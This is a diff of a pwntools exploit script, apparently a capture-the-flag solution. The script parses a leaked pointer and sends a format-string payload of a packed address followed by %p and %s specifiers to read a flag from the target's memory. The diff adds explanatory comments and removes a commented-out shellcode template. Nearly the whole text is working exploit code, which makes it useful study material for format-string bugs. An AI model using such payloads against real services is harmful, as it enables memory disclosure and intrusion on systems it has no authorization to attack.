@@ -54,24 +54,17 @@ log.info(io.recvline())
 received = io.recvline(keepends=False)
 log.info(received)
 
+# the first received value is the pointer address of the flag
 addr = int(received[-8:], 16)
 
+# we can massage the format string to build a payload
+# this boug explains it quite well https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b
 attack = p32(addr) + b" %p %p %p %p %p %p %s %p %p"
-#attack = b"AAAAAAAAAAAAAA" + b" %p %p %p %p %p %p %s %p"
 
 log.info("Payload is %s", attack)
 
 log.info(io.recvline())
 
 io.sendline(attack)
-
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
 
 io.interactive()
